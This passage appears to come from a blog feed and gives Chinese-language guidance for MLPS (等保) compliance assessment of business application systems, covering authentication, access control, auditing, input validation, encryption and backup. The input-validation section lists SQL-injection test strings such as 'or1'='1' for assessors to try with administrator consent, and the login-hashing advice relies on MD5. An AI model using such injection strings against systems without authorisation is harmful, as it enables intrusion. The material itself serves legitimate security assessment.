title="a）应采用密码技术保证重要数据在传输过程中的保密性，包括但不限于鉴别数据、重要业务数据和重要个人信息等"></a>a）应采用密码技术保证重要数据在传输过程中的保密性，包括但不限于鉴别数据、重要业务数据和重要个人信息等</h2><p>对于B&#x2F;S类型的应用系统来说，一般都是使用HTTPS协议，HTTPS协议同时实现了保密性和完整性。</p><p>而对于C&#x2F;S类型的应用系统来说，如果是直接连接数据库的那种，要看数据库是否配置了SSL，在连接的时候是否使用了SSL。</p><h3 id="高风险-1"><a href="#高风险-1" class="headerlink" title="高风险"></a>高风险</h3><p>对于三级及以上的系统，数据明文传输是高风险项。</p><p><img src="/img/20230808085417.png"></p><p><img src="/img/20230808085452.png"></p><h2 id="b）应采用密码技术保证重要数据在存储过程中的保密性，包括但不限于鉴别数据、重要业务数据和重要个人信息等"><a href="#b）应采用密码技术保证重要数据在存储过程中的保密性，包括但不限于鉴别数据、重要业务数据和重要个人信息等" class="headerlink" title="b）应采用密码技术保证重要数据在存储过程中的保密性，包括但不限于鉴别数据、重要业务数据和重要个人信息等"></a>b）应采用密码技术保证重要数据在存储过程中的保密性，包括但不限于鉴别数据、重要业务数据和重要个人信息等</h2><p>询问管理员，是否采用了密码技术存储数据，使用了什么加密算法，比如SM4加密算法。</p><h3 id="高风险-2"><a href="#高风险-2" class="headerlink" title="高风险"></a>高风险</h3><p>对于三级及以上系统，没有加密存储即为高风险项。</p><p><img src="/img/20230808085808.png"></p><h1 id="三、数据备份恢复"><a href="#三、数据备份恢复" class="headerlink" title="三、数据备份恢复"></a>三、数据备份恢复</h1><h2 id="a）应提供重要数据的本地数据备份与恢复功能"><a href="#a）应提供重要数据的本地数据备份与恢复功能" class="headerlink" title="a）应提供重要数据的本地数据备份与恢复功能"></a>a）应提供重要数据的本地数据备份与恢复功能</h2><p>询问管理员，应用系统中重要数据(例如重要业务数据、重要审计数据、重要视频数据和重要个人信息等)的备份策略，有没有本地备份；</p><p>检查是否进行过数据恢复测试，确保备份文件的有效性。</p><h3 id="高风险-3"><a href="#高风险-3" class="headerlink" title="高风险"></a>高风险</h3><p>应用系统没有备份措施或者重要数据备份到诸如网盘</p><p><img src="/img/20230808111430.png"></p><h2 id="b）应提供异地实时备份功能，利用通信网络将重要数据实时备份至备份场地"><a href="#b）应提供异地实时备份功能，利用通信网络将重要数据实时备份至备份场地" class="headerlink" title="b）应提供异地实时备份功能，利用通信网络将重要数据实时备份至备份场地"></a>b）应提供异地实时备份功能，利用通信网络将重要数据实时备份至备份场地</h2><h3 id="高风险-4"><a href="#高风险-4" class="headerlink" title="高风险"></a>高风险</h3><p><img src="/img/20230808111514.png"></p><h2 id="c）应提供重要数据处理系统的热冗余，保证系统的高可用性"><a href="#c）应提供重要数据处理系统的热冗余，保证系统的高可用性" class="headerlink" title="c）应提供重要数据处理系统的热冗余，保证系统的高可用性"></a>c）应提供重要数据处理系统的热冗余，保证系统的高可用性</h2><h3 id="高风险-5"><a href="#高风险-5" class="headerlink" title="高风险"></a>高风险</h3><p><img src="/img/20230808111534.png"></p><h2 id="d）应建立异地灾难备份中心，提供业务应用的实时切换"><a href="#d）应建立异地灾难备份中心，提供业务应用的实时切换" class="headerlink" title="d）应建立异地灾难备份中心，提供业务应用的实时切换"></a>d）应建立异地灾难备份中心，提供业务应用的实时切换</h2><p>这一项只适用于四级系统，没什么好说的，基本上接触不到。</p><h3 id="高风险-6"><a href="#高风险-6" class="headerlink" title="高风险"></a>高风险</h3><p><img src="/img/20230808111629.png"></p>]]></content>
      
      
      
        <tags>
            
            <tag> 等保 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>等保测评：业务应用系统</title>
      <link href="/2023/12/03/%E7%AD%89%E4%BF%9D%E6%B5%8B%E8%AF%84%EF%BC%9A%E4%B8%9A%E5%8A%A1%E5%BA%94%E7%94%A8%E7%B3%BB%E7%BB%9F/"/>
      <url>/2023/12/03/%E7%AD%89%E4%BF%9D%E6%B5%8B%E8%AF%84%EF%BC%9A%E4%B8%9A%E5%8A%A1%E5%BA%94%E7%94%A8%E7%B3%BB%E7%BB%9F/</url>
      
        <content type="html"><![CDATA[<h1 id="一、-身份鉴别"><a href="#一、-身份鉴别" class="headerlink" title="一、 身份鉴别"></a>一、 身份鉴别</h1><h2 id="a）应对登录的用户进行身份标识和鉴别，身份标识具有唯一性，身份鉴别信息具有复杂度要求并定期更换"><a href="#a）应对登录的用户进行身份标识和鉴别，身份标识具有唯一性，身份鉴别信息具有复杂度要求并定期更换" class="headerlink" title="a）应对登录的用户进行身份标识和鉴别，身份标识具有唯一性，身份鉴别信息具有复杂度要求并定期更换"></a>a）应对登录的用户进行身份标识和鉴别，身份标识具有唯一性，身份鉴别信息具有复杂度要求并定期更换</h2><p>这里的身份标识和鉴别，说的就是用户名和口令了，具体表现出来就是你进入某个应用系统的管理后台，需要输入用户名以及口令，一般来说应用都是符合这个要求的。</p><p>身份标识具有唯一性，就是检查是否有同名账户，可以在征得管理员同意后，试着新建一个已存在账户的同名账户，看是否能创建成功。这里还有一个隐藏的要求是，查看有没有空口令账户，一般都是没有的。</p><p>身份鉴别信息具有复杂度要求，需要询问管理员，系统是否有登录密码的复杂度限制功能。</p><p>定期更换的要求，询问管理员，是否有限制密码周期的功能，上一次修改密码是什么时候。</p><h3 id="高风险"><a href="#高风险" class="headerlink" title="高风险"></a>高风险</h3><p>1）根据中关村信息安全测评联盟发布的高风险判定指引文件，如果没有口令复杂度限制功能且不是仅内网访问的，属于高风险。</p><p><img src="/img/20230803172929.png"></p><p>2）存在弱口令同样也是高风险。</p><p><img src="/img/20230804152732.png"></p><h2 id="b）应具有登录失败处理功能，应配置并启用结束会话、限制非法登录次数和当登录连接超时自动退出等相关措施"><a href="#b）应具有登录失败处理功能，应配置并启用结束会话、限制非法登录次数和当登录连接超时自动退出等相关措施" class="headerlink" title="b）应具有登录失败处理功能，应配置并启用结束会话、限制非法登录次数和当登录连接超时自动退出等相关措施"></a>b）应具有登录失败处理功能，应配置并启用结束会话、限制非法登录次数和当登录连接超时自动退出等相关措施</h2><p>登录失败处理，如果存在这个功能，一般就是连续登录失败几次后永久锁定或者锁定一段时间。存在相关的配置页面，就看看配置页面是怎么设置的；功能写在代码中的，最好还是测试一下，要经过管理员同意后再测试，以免影响业务，一般测试后会出现诸如“多次密码输入错误，账户被锁定，请在xx分钟后重新尝试登录”这样的警告。</p><p>超时自动退出，一般设置为10-15分钟，监控类系统可不设置。这个功能的，有配置页面的不多，一般都是在代码中或者配置文件（比如<a href="https://www.runoob.com/aspnet/aspnet-tutorial.html">ASP.NET</a>的<a href="https://blog.csdn.net/xingxing513234072/article/details/8182654">web.config</a>）中实现，不是很好找到明确的证据，最好还是实际试验下。等待一段时间后，刷新下，看看是否已经注销。</p><h3 id="高风险-1"><a href="#高风险-1" class="headerlink" title="高风险"></a>高风险</h3><p>如果没有登录失败处理功能，将视为高风险。</p><p><img src="/img/20230807092406.png"></p><h2 id="c）当进行远程管理时，应采取必要措施防止鉴别信息在网络传输过程中被窃听"><a href="#c）当进行远程管理时，应采取必要措施防止鉴别信息在网络传输过程中被窃听" class="headerlink" title="c）当进行远程管理时，应采取必要措施防止鉴别信息在网络传输过程中被窃听"></a>c）当进行远程管理时，应采取必要措施防止鉴别信息在网络传输过程中被窃听</h2><p>此测评项要求，在远程管理登录应用系统的时候，身份鉴别信息禁止明文传输。首先查看这个网站是否使用了https协议，如果使用了，然后看一看使用http前缀是否能正常访问，有些网站没有做好配置，导致http和https都可以访问，要给http禁掉。</p><p>如果没有使用https，但是使用了客户端&#x2F;前端加密，服务端解密这样的方式来防止明文传输，可酌情给予部分符合。</p><p>前端加密，一般都是使用md5算法计算出口令的hash值，然后再进行传输。如果前端传输口令hash值，而后端数据库存储的也仅仅只有口令的hash值，鉴别的方法就是对比前端传入的hash值是否与数据库中存储的hash值一致。在这种情况下，虽然前端传输的并非口令明文，但是实际上还是泄露了鉴别信息。这个时候，鉴别信息指的就不是口令，而是口令的hash值，此时，明文传输hash值就是明文传输鉴别信息。如果别人截取到口令的hash值，虽然不能够轻易获得原口令，但是可以使用该hahs值和用户名通过应用系统的鉴别。</p><p>也就是说，不能只在服务端，存储解密后的值，去对比前端加密后的值，服务端一定要有加解密的步骤，比如加盐。</p><p>当用户访问登录界面时，后端生成一个随机盐值（随机字符串），同时前端也得到这个字符串salt。此时，前端可以使用以下算法计算出一个hash值：<code>MD5(MD5(password)+MD5(salt))</code> 。当然，这个算法你可以自己决定，根据实际情况进行嵌套使用，使用其他的hash算法都是可以的。</p><p>然后当这个hash值传输至后端后，数据库中存储的是MD5(password)，后端也有那个随机盐值salt，也可以使用同样的算法算出一个hash值，进行对比，即可得到结果。这样的话，别人截取到了这个hash值也没啥用，基本没有办法从hahs值逆向算出原文。这样就基本实现了鉴别信息防窃听的要求。</p><h3 id="高风险-2"><a href="#高风险-2" class="headerlink" title="高风险"></a>高风险</h3><p>身份鉴别信息明文传输为高风险。</p><p><img src="/img/20230807095219.png"></p><h2 id="d）应采用口令、密码技术、生物技术等两种或两种以上组合的鉴别技术对用户进行身份鉴别，且其中一种鉴别技术至少应使用密码技术来实现"><a href="#d）应采用口令、密码技术、生物技术等两种或两种以上组合的鉴别技术对用户进行身份鉴别，且其中一种鉴别技术至少应使用密码技术来实现" class="headerlink" title="d）应采用口令、密码技术、生物技术等两种或两种以上组合的鉴别技术对用户进行身份鉴别，且其中一种鉴别技术至少应使用密码技术来实现"></a>d）应采用口令、密码技术、生物技术等两种或两种以上组合的鉴别技术对用户进行身份鉴别，且其中一种鉴别技术至少应使用密码技术来实现</h2><p>双因子认证，其中必须有一项是密码技术。用户名+密码属于是口令方式的认证，密码技术一般使用ukey实现身份认证。</p><p>管理员和内部用户强制使用，外部用户推荐使用。</p><h3 id="高风险-3"><a href="#高风险-3" class="headerlink" title="高风险"></a>高风险</h3><p>对于三级及以上的系统，没有双因子认证是高风险。可根据补偿因素酌情判定风险等级。</p><p><img src="/img/20230807100716.png"></p><h1 id="二、-访问控制"><a href="#二、-访问控制" class="headerlink" title="二、 访问控制"></a>二、 访问控制</h1><h2 id="a）应对登录的用户分配账户和权限"><a href="#a）应对登录的用户分配账户和权限" class="headerlink" title="a）应对登录的用户分配账户和权限"></a>a）应对登录的用户分配账户和权限</h2><p>分配账户，顾名思义，给每一个人分配一个账户。</p><p>权限分配，看系统是否有权限分配的功能，不同的用户角色要有不同的权限。</p><h2 id="b）应重命名或删除默认账户，修改默认账户的默认口令"><a href="#b）应重命名或删除默认账户，修改默认账户的默认口令" class="headerlink" title="b）应重命名或删除默认账户，修改默认账户的默认口令"></a>b）应重命名或删除默认账户，修改默认账户的默认口令</h2><p>一些出名的应用系统，其默认账户密码都在网上流传，应重命名或删除应用系统默认的账户，并且修改账户的默认口令。</p><h3 id="高风险-4"><a href="#高风险-4" class="headerlink" title="高风险"></a>高风险</h3><p>默认口令未修改，应判定为高风险。</p><p><img src="/img/20230807104835.png"></p><h2 id="c）应及时删除或停用多余的、过期的账户，避免共享账户的存在"><a href="#c）应及时删除或停用多余的、过期的账户，避免共享账户的存在" class="headerlink" title="c）应及时删除或停用多余的、过期的账户，避免共享账户的存在"></a>c）应及时删除或停用多余的、过期的账户，避免共享账户的存在</h2><p>应核查是否存在多余、过期的账户；检查实际管理员用户与系统账户之间是否一一对应，是否存在共享账号的情况。一般符合。</p><h2 id="d）应授予管理用户所需的最小权限，实现管理用户的权限分离"><a href="#d）应授予管理用户所需的最小权限，实现管理用户的权限分离" class="headerlink" title="d）应授予管理用户所需的最小权限，实现管理用户的权限分离"></a>d）应授予管理用户所需的最小权限，实现管理用户的权限分离</h2><p>查看应用系统是否实行了三权分立，即系统管理员、安全管理员和审计管理员的权限分配。</p><p>如果没有三权分立，但是进行了最小权限的限制，也属于符合。</p><blockquote><p>系统管理员：管理系统中的账户、文档、文件等；</p><p>安全管理员：管理系统的授权策略以及其它基本策略的设置，还有安全参数的设置。</p><p>审计管理员：对系统中审计策略的管理，比如日志的存储策略。</p></blockquote><p>如果业务比较多，比如医院的系统、财务系统或者其他系统，权限本来就会分得比较细，甚至非常细。这种情况下，给个符合是没有多大问题的。</p><p>如果业务规模比较小，可能权限分配的粒度就非常粗了。比如某个应用系统就两个角色，一类是普通用户，一类是后台用户，一般都不符合最小权限的分配，可给部分符合。</p><h2 id="e）应由授权主体配置访问控制策略，访问控制策略规定主体对客体的访问规则"><a href="#e）应由授权主体配置访问控制策略，访问控制策略规定主体对客体的访问规则" class="headerlink" title="e）应由授权主体配置访问控制策略，访问控制策略规定主体对客体的访问规则"></a>e）应由授权主体配置访问控制策略，访问控制策略规定主体对客体的访问规则</h2><p>应由授权主体配置访问控制策略，意思就是应该由管理员配置访问控制策略，普通用户不能有这种权限，基本上应用系统都符合。</p><p>访问控制策略规定主体对客体的访问规则，意思是要限制用户对资源的访问，只能访问自己权限下的模块或资源。</p><h3 id="高风险-5"><a href="#高风险-5" class="headerlink" title="高风险"></a>高风险</h3><p>访问规则没配置好，有可能会导致越权访问或非授权访问，为高风险。</p><p><img src="/img/20230807111108.png"></p><h2 id="f）访问控制的粒度应达到主体为用户级或进程级，客体为文件、数据库表级"><a href="#f）访问控制的粒度应达到主体为用户级或进程级，客体为文件、数据库表级" class="headerlink" title="f）访问控制的粒度应达到主体为用户级或进程级，客体为文件、数据库表级"></a>f）访问控制的粒度应达到主体为用户级或进程级，客体为文件、数据库表级</h2><p>测评项的要求应该是层层递进的，测评项e要求你设置访问控制策略，f项则是要求你设置的访问控制的粒度达到“主体为用户级或进程级，客体为文件、数据库表级”。</p><p>所以在实际测评中，如果测评项e的结果是不满足，f项肯定也不满足。</p><p>对于大部分应用系统而言，其访问控制策略，是可以达到主体为用户级、客体为文件级的。</p><p>测评的时候，看策略是否明确到某个用户（而不仅仅是用户组），某个文件（不仅仅是文件夹）。</p><p>这里其实细究的话，从某个角度上来说，有一部分应用系统是不完全符合的。基本上应用系统的权限分配方式都是角色拥有权限，用户再属于某个角色，这样用户也就获得了权限。但是如果要达到访问控制的粒度为用户级，应该还要有一个功能，就是也能直接把某个具体的权限赋予给某个具体的用户。这样，粒度就确切的达到了用户级。否则，你想调整权限，实际就得调整角色的权限，角色下面有多个用户，你就相当于调整了某一类用户的权限。除非你为了实现细粒度的控制，某些角色下面只有一个用户。当然，实际测评中根据具体情况进行结果判定，没有必要这么深究。</p><p>访问控制的粒度达到表级，这里并不是让你跑去数据库中进行查看，直接在应用系统中判断就好。应用系统中一个表单页面可以大概的类比于数据库中的一个表，比如个人信息表、业务表等。所以这个就是要看权限分配的时候，是否能直接对表单页面的权限进行分配，比如允许访问什么的。表单页面的权限一般就是功能栏、菜单栏的权限分配，大部分应用系统都可以做到。甚至有些做得更细致，比如细致到某个表单的按钮的权限上。</p><h2 id="g）应对重要主体和客体设置安全标记，并控制主体对有安全标记信息资源的访问。"><a href="#g）应对重要主体和客体设置安全标记，并控制主体对有安全标记信息资源的访问。" class="headerlink" title="g）应对重要主体和客体设置安全标记，并控制主体对有安全标记信息资源的访问。"></a>g）应对重要主体和客体设置安全标记，并控制主体对有安全标记信息资源的访问。</h2><p>对重要主体设置安全标记，上文中讲到用户可以被分配到某一个角色下面，那么只要把这个角色设置为重要的安全角色，并在权限上对此角色加以限制，就实现了对重要主体设置安全标记。</p><p>对客体设置安全标记，我的理解是，要让系统有这么一个功能：可以对重要的资源打“标签”，标记为敏感数据，限制用户（主体）对这些被打上安全标记的资源的访问。基本就没有能实现的，一般为不符合。</p><h1 id="三、安全审计"><a href="#三、安全审计" class="headerlink" title="三、安全审计"></a>三、安全审计</h1><h2 id="a）应启用安全审计功能，审计覆盖到每个用户，对重要的用户行为和重要安全事件进行审计"><a href="#a）应启用安全审计功能，审计覆盖到每个用户，对重要的用户行为和重要安全事件进行审计" class="headerlink" title="a）应启用安全审计功能，审计覆盖到每个用户，对重要的用户行为和重要安全事件进行审计"></a>a）应启用安全审计功能，审计覆盖到每个用户，对重要的用户行为和重要安全事件进行审计</h2><p>检查应用系统是否有安全审计功能(专门的安全审计模块或不同模块中的审计功能);检查安全审计功能的范围是否覆盖所有用户，审计的安全事件是否合理，如是否包括应用系统重要安全事件 (如帐户建立、用户权限分配、重要业务数据操作、用户身份鉴别失败等行为)。</p><p>对于应用系统而言，最好的审计就是存在比较完善的操作日志，什么用户什么时间干了什么，都记录的清清楚楚，那就是绝对的符合。但是很多应用系统这方面的功能并不全，可能仅存在登录日志，但这也行，至少可以判定为部分符合。</p><p>如果被测评项系统找不到什么日志功能，可以考虑去业务流程模块去看看。很多政府部门的应用系统在业务流程记录这是很详细的，某人什么时候对某业务进行了什么操作，这也能判定为部分符合。</p><h3 id="高风险-6"><a href="#高风险-6" class="headerlink" title="高风险"></a>高风险</h3><p>没有审计功能并且未采取其他审计措施即为高风险。</p><p><img src="/img/20230807142245.png"></p><h2 id="b）审计记录应包括事件的日期和时间、用户、事件类型、事件是否成功及其他与审计相关的信息"><a href="#b）审计记录应包括事件的日期和时间、用户、事件类型、事件是否成功及其他与审计相关的信息" class="headerlink" title="b）审计记录应包括事件的日期和时间、用户、事件类型、事件是否成功及其他与审计相关的信息"></a>b）审计记录应包括事件的日期和时间、用户、事件类型、事件是否成功及其他与审计相关的信息</h2><p>应核查审计记录信息是否包括事件的日期和时间、主体标识、客体标识、事件类型、事件是否成功及其他与审计相关的信息。</p><p>有什么字段就写什么字段，至少应该包括日期、用户、事件、具体操作这四个字段，要不然就是部分符合。</p><h2 id="c）应对审计记录进行保护，定期备份，避免受到未预期的删除、修改或覆盖等"><a href="#c）应对审计记录进行保护，定期备份，避免受到未预期的删除、修改或覆盖等" class="headerlink" title="c）应对审计记录进行保护，定期备份，避免受到未预期的删除、修改或覆盖等"></a>c）应对审计记录进行保护，定期备份，避免受到未预期的删除、修改或覆盖等</h2><p>对审计记录进行保护，看应用系统有没有删除记录的功能，一般是没有的，非要删除就得跑去数据库或服务器上删除，这种情况是符合的。如果存在删除功能，比如日志删除的按钮，就要看是这个按钮的权限是如何分配的，是否仅分配给管理员账户。</p><p>定期备份，如果记录存储在数据库中，看数据库是否定期备份；如果记录存储在文件中，则看文件是否定期备份。留存时间要大于6个月，查看最早的记录距离现在是否超过6个月。</p><h3 id="高风险-7"><a href="#高风险-7" class="headerlink" title="高风险"></a>高风险</h3><p>审计记录能被恶意删除，高风险；日志留存时间少于6个月，高风险（除非应用系统的上线时间少于6个月）。</p><p><img src="/img/20230807143628.png"></p><h2 id="d）应对审计进程进行保护，防止未经授权的中断"><a href="#d）应对审计进程进行保护，防止未经授权的中断" class="headerlink" title="d）应对审计进程进行保护，防止未经授权的中断"></a>d）应对审计进程进行保护，防止未经授权的中断</h2><p>对应用系统进行测试。如果审计模块是一个单独的进程，则尝试非授权中断审计进程，查看是否成功；如果审计模块是一个独立的功能，则尝试非授权关闭审计功能，查看是否成功。</p><p>大部分情况是审计进程与应用进程为同一个，无法被独立中断。审计进程随应用启动而启动，应用系统界面无关闭审计按钮，审计功能无法单独关闭。如果有设置关闭功能的话，要看看这个关闭功能是否只有管理员有权限。</p><h1 id="四、入侵防范"><a href="#四、入侵防范" class="headerlink" title="四、入侵防范"></a>四、入侵防范</h1><h2 id="a）应遵循最小安装的原则，仅安装需要的组件和应用程序"><a href="#a）应遵循最小安装的原则，仅安装需要的组件和应用程序" class="headerlink" title="a）应遵循最小安装的原则，仅安装需要的组件和应用程序"></a>a）应遵循最小安装的原则，仅安装需要的组件和应用程序</h2><p>根据GB&#x2F;T 28448-2019《信息安全技术网络安全等级保护测评要求》测评对象范围描述，应用系统无该项要求。此控制项测评对象针对服务器，不包含业务应用系统，此项不适用。</p><h2 id="b）应关闭不需要的系统服务、默认共享和高危端口"><a href="#b）应关闭不需要的系统服务、默认共享和高危端口" class="headerlink" title="b）应关闭不需要的系统服务、默认共享和高危端口"></a>b）应关闭不需要的系统服务、默认共享和高危端口</h2><p>根据GB&#x2F;T 28448-2019《信息安全技术网络安全等级保护测评要求》测评对象范围描述，应用系统无该项要求。此控制项测评对象针对服务器，不包含业务应用系统，此项不适用。</p><h2 id="c）应通过设定终端接入方式或网络地址范围对通过网络进行管理的管理终端进行限制"><a href="#c）应通过设定终端接入方式或网络地址范围对通过网络进行管理的管理终端进行限制" class="headerlink" title="c）应通过设定终端接入方式或网络地址范围对通过网络进行管理的管理终端进行限制"></a>c）应通过设定终端接入方式或网络地址范围对通过网络进行管理的管理终端进行限制</h2><p>根据GB&#x2F;T 28448-2019《信息安全技术网络安全等级保护测评要求》测评对象范围描述，应用系统无该项要求。此控制项测评对象针对服务器，不包含业务应用系统，此项不适用。</p><h2 id="d）应提供数据有效性检验功能，保证通过人机接口输入或通过通信接口输入的内容符合系统设定要求"><a href="#d）应提供数据有效性检验功能，保证通过人机接口输入或通过通信接口输入的内容符合系统设定要求" class="headerlink" title="d）应提供数据有效性检验功能，保证通过人机接口输入或通过通信接口输入的内容符合系统设定要求"></a>d）应提供数据有效性检验功能，保证通过人机接口输入或通过通信接口输入的内容符合系统设定要求</h2><p>数据有效性检验，就是对用户输入的数据进行过滤，是否符合应用系统所要求的数据格式、类型。人机接口和通信接口，指的就是输入框。</p><p>1、检查系统是否在数据输入界面对无效或非法数据进行检验，如注册用户时是否可以以– or1&#x3D;1–等做为用户名，传送给服务器的参数(如查询关键字、url中的参数等)中包含特殊字符( or1’&#x3D;’1,and 1&#x3D;1–，and 1&#x3D;0–or 1&#x3D;0–)时是否可以正常处理；</p><p>2、除特殊字符校验外，还应添加对数据有效性的校验，如尝试输入长度不符合要求，只允许输入数字的地方输入字母等查看系统反应，比如要求输入金额、数字的地方，输入字母等非法数据是否可以提交。或者输入负数。</p><p>3、检查系统返回的错误信息中是否含有sql语句、sql错误信息以及web服务器的绝对路径等;</p><p>测试的时候一定要经过系统管理员的同意。</p><h3 id="高风险-8"><a href="#高风险-8" class="headerlink" title="高风险"></a>高风险</h3><p>基本上应用系统都有数据有效性检验功能，但是如果检验不严谨导致系统出现了高危漏洞并且未采取防护手段，就得判定为高风险了。</p><p><img src="/img/20230807152227.png"></p><h2 id="e）应能发现可能存在的已知漏洞，并在经过充分测试评估后，及时修补漏洞"><a href="#e）应能发现可能存在的已知漏洞，并在经过充分测试评估后，及时修补漏洞" class="headerlink" title="e）应能发现可能存在的已知漏洞，并在经过充分测试评估后，及时修补漏洞"></a>e）应能发现可能存在的已知漏洞，并在经过充分测试评估后，及时修补漏洞</h2><p>应能发现可能存在的已知漏洞，询问管理员是否定期对应用系统进行漏洞扫描或者渗透测试（对于c&#x2F;s架构以渗透为主），或购买了这样的安全服务。然后，如果对方说有，就让其提交相关的扫描报告、渗透报告。</p><h3 id="高风险-9"><a href="#高风险-9" class="headerlink" title="高风险"></a>高风险</h3><p>这个就需要看测评过程中，渗透部的同事对应用系统进行漏洞扫描、渗透测试的时候，有没有发现高危漏洞。如果有就高风险，说明管理员做定期漏扫的时候没扫出来，有安全风险。</p><p><img src="/img/20230807152331.png"></p><h2 id="f）应能够检测到对重要节点进行入侵的行为，并在发生严重入侵事件时提供报警"><a href="#f）应能够检测到对重要节点进行入侵的行为，并在发生严重入侵事件时提供报警" class="headerlink" title="f）应能够检测到对重要节点进行入侵的行为，并在发生严重入侵事件时提供报警"></a>f）应能够检测到对重要节点进行入侵的行为，并在发生严重入侵事件时提供报警</h2><p>根据GB&#x2F;T 28448-2019《信息安全技术网络安全等级保护测评要求》测评对象范围描述，应用系统无该项要求。此控制项测评对象针对服务器，不包含业务应用系统，此项不适用。</p><h1 id="五、可信验证"><a href="#五、可信验证" class="headerlink" title="五、可信验证"></a>五、可信验证</h1><h2 id="a）可基于可信根对计算设备的系统引导程序、系统程序、重要配置参数和应用程序等进行可信验证，并在应用程序的关键执行环节进行动态可信验证，在检测到其可信性受到破坏后进行报警，并将验证结果形成审计记录送至安全管理中心。"><a href="#a）可基于可信根对计算设备的系统引导程序、系统程序、重要配置参数和应用程序等进行可信验证，并在应用程序的关键执行环节进行动态可信验证，在检测到其可信性受到破坏后进行报警，并将验证结果形成审计记录送至安全管理中心。" class="headerlink" title="a）可基于可信根对计算设备的系统引导程序、系统程序、重要配置参数和应用程序等进行可信验证，并在应用程序的关键执行环节进行动态可信验证，在检测到其可信性受到破坏后进行报警，并将验证结果形成审计记录送至安全管理中心。"></a>a）可基于可信根对计算设备的系统引导程序、系统程序、重要配置参数和应用程序等进行可信验证，并在应用程序的关键执行环节进行动态可信验证，在检测到其可信性受到破坏后进行报警，并将验证结果形成审计记录送至安全管理中心。</h2><p>此控制项测评对象针对服务器，不包含业务应用系统，此项不适用。</p><h1 id="六、数据完整性"><a href="#六、数据完整性" class="headerlink" title="六、数据完整性"></a>六、数据完整性</h1><h2 id="a-应采用校验技术或密码技术保证重要数据在传输过程中的完整性，包括但不限于鉴别数据、重要业务数据、重要审计数据、重要配置数据、重要视频数据和重要个人信息等"><a href="#a-应采用校验技术或密码技术保证重要数据在传输过程中的完整性，包括但不限于鉴别数据、重要业务数据、重要审计数据、重要配置数据、重要视频数据和重要个人信息等" class="headerlink" title="a)应采用校验技术或密码技术保证重要数据在传输过程中的完整性，包括但不限于鉴别数据、重要业务数据、重要审计数据、重要配置数据、重要视频数据和重要个人信息等"></a>a)应采用校验技术或密码技术保证重要数据在传输过程中的完整性，包括但不限于鉴别数据、重要业务数据、重要审计数据、重要配置数据、重要视频数据和重要个人信息等</h2><p>完整性：是指保持信息不被破坏或修改、不丢失和信息未经授权不能改变的特性，也是最基本的安全特征。</p><p>对于B&#x2F;S类型的应用系统来说，一般都是使用HTTPS协议，HTTPS协议同时实现了保密性和完整性。</p><p>而对于C&#x2F;S类型的应用系统来说，如果是直接连接数据库的那种，要看数据库是否配置了SSL，在连接的时候是否使用了SSL。</p><p>以下是指导书内容：</p><p>1、可访谈系统开发人员，询问系统在通信过程中是否采用密码技术(RSA数字签名等算法，加密机、VPN通道等技术)或采用SSL (https)协议传输数据，以保证数据在通信过程中的完整性;</p><p>2、可结合案例验证，如通过获取网络通信数据包，查看通信报文是否含有用于完整性保护的验证信息。比如数据包中含有使用密码技术生成的用于完整性保护的MAC校验信息。</p><p>1和2任一符合即可判定此项符合。</p><h3 id="高风险-10"><a href="#高风险-10" class="headerlink" title="高风险"></a>高风险</h3><p>对于三级及以上的系统，数据传输的过程中没有保护措施即为高风险。</p><p><img src="/img/20230808084613.png"></p><p><img src="/img/20230808084726.png"></p><h2 id="b-应采用校验技术或密码技术保证重要数据在存储过程中的完整性，包括但不限于鉴别数据、重要业务数据、重要审计数据、重要配置数据、重要视频数据和重要个人信息等"><a href="#b-应采用校验技术或密码技术保证重要数据在存储过程中的完整性，包括但不限于鉴别数据、重要业务数据、重要审计数据、重要配置数据、重要视频数据和重要个人信息等" class="headerlink" title="b)应采用校验技术或密码技术保证重要数据在存储过程中的完整性，包括但不限于鉴别数据、重要业务数据、重要审计数据、重要配置数据、重要视频数据和重要个人信息等"></a>b)应采用校验技术或密码技术保证重要数据在存储过程中的完整性，包括但不限于鉴别数据、重要业务数据、重要审计数据、重要配置数据、重要视频数据和重要个人信息等</h2><p>这里要注意和传输过程分开区别，传输过程是一个短暂的、动态的、进行过程，而这里的存储则其实应该理解为长期的保存的过程。</p><p>应用系统中，一般都会将重要的数据存储到数据库当中。应当询问管理员，是否采用了密码技术存储数据，使用了什么加密算法，比如SM4加密算法。</p><h1 id="七、数据保密性"><a href="#七、数据保密性" class="headerlink" title="七、数据保密性"></a>七、数据保密性</h1><h2 id="a）应采用密码技术保证重要数据在传输过程中的保密性，包括但不限于鉴别数据、重要业务数据和重要个人信息等"><a href="#a）应采用密码技术保证重要数据在传输过程中的保密性，包括但不限于鉴别数据、重要业务数据和重要个人信息等" class="headerlink" title="a）应采用密码技术保证重要数据在传输过程中的保密性，包括但不限于鉴别数据、重要业务数据和重要个人信息等"></a>a）应采用密码技术保证重要数据在传输过程中的保密性，包括但不限于鉴别数据、重要业务数据和重要个人信息等</h2><p>对于B&#x2F;S类型的应用系统来说，一般都是使用HTTPS协议，HTTPS协议同时实现了保密性和完整性。</p><p>而对于C&#x2F;S类型的应用系统来说，如果是直接连接数据库的那种，要看数据库是否配置了SSL，在连接的时候是否使用了SSL。</p><h3 id="高风险-11"><a href="#高风险-11" class="headerlink" title="高风险"></a>高风险</h3><p>对于三级及以上的系统，数据明文传输是高风险项。</p><p><img src="/img/20230808085417.png"></p><p><img src="/img/20230808085452.png"></p><h2 id="b）应采用密码技术保证重要数据在存储过程中的保密性，包括但不限于鉴别数据、重要业务数据和重要个人信息等"><a href="#b）应采用密码技术保证重要数据在存储过程中的保密性，包括但不限于鉴别数据、重要业务数据和重要个人信息等" class="headerlink" title="b）应采用密码技术保证重要数据在存储过程中的保密性，包括但不限于鉴别数据、重要业务数据和重要个人信息等"></a>b）应采用密码技术保证重要数据在存储过程中的保密性，包括但不限于鉴别数据、重要业务数据和重要个人信息等</h2><p>询问管理员，是否采用了密码技术存储数据，使用了什么加密算法，比如SM4加密算法。</p><h3 id="高风险-12"><a href="#高风险-12" class="headerlink" title="高风险"></a>高风险</h3><p>对于三级及以上系统，没有加密存储即为高风险项。</p><p><img src="/img/20230808085808.png"></p><h1 id="八、剩余信息保护"><a href="#八、剩余信息保护" class="headerlink" title="八、剩余信息保护"></a>八、剩余信息保护</h1><h2 id="a）应保证鉴别信息所在的存储空间被释放或重新分配前得到完全清除"><a href="#a）应保证鉴别信息所在的存储空间被释放或重新分配前得到完全清除" class="headerlink" 